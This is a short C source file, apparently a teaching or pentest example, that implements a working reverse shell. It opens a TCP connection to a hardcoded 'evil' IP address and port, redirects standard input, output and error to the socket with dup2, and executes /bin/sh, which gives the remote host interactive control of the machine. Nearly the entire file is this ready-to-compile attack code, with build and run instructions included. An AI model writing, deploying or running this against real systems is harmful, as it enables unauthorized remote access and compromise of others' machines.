/*

Author: Abhinav Thakur
File:   reverse_shell.c
Compile:        $ gcc -g reverse_shell.c -o ./reverse_shell.elf
Run            :$ ./reverse_shell.elf

NOTE: For internet programming, refer to $ man 7 ip

socket(2) + dup2([0,1,2], sockfd) + connect(2)

*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>
#include <netinet/ip.h>		/* superset of netinet/in.h, see ip(7) */
#include <arpa/inet.h>		/* convert values between host & network byte order */

#define EVIL_IP "192.168.1.6"
#define EVIL_PORT 19999

int main ()
{
	/* create an internet socket (man 7 ip) */
	int sockfd = socket (AF_INET, SOCK_STREAM, 0);

	/* connect to evil machine */
	struct sockaddr_in evilAddr;
	memset (&evilAddr, 0, sizeof(evilAddr));		/* clear the structure */
	evilAddr.sin_family = AF_INET;					/* internet family */
	evilAddr.sin_port = htons(EVIL_PORT);			/* host->network byte order */	
	evilAddr.sin_addr.s_addr = inet_addr(EVIL_IP);  /* ASCII->binary data in NBO */ 
	int evilfd = connect (sockfd, (struct sockaddr *)&evilAddr, sizeof(evilAddr));
	
	/* STD[IN|OUT|ERR]_FILENO should point to open sockfd file description. */	
	for (int i = 0; i < 3; ++i)
		dup2 (sockfd, i);

	/* spawn a shell */
	execve ("/bin/sh", 0, 0);	
}
